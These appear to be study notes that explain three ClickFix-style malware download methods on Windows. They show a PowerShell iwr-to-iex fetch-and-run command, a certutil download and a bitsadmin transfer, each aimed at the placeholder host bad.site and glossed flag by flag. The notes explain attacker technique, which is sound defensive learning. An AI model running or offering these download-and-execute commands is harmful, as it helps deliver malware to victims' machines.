Variant 2 -- cmd.exe ClickFix
  cmd /c powershell iwr http://bad.site/file.ps1 | iex

cmd - command Prompt [ execute command]
/c - close CMD

Variant 3 -- Using Certutil

  certutil -urlcache -split -f http://bad.site/file.exe file.exe

certutil - windows certificate utility (abused to download)
-urlcache - Download file from URL
-split - split file into chunks
-f - Force overwrite
Meaning: Doenload malware using built-in tool.

Variant 4 -- bitsadmin

bitsadmin /transfer job http://bad.site/file.exe C:\Temp\file.exe

bitsadmin - windows background downloader
/transfer - start download (used for stealth download)

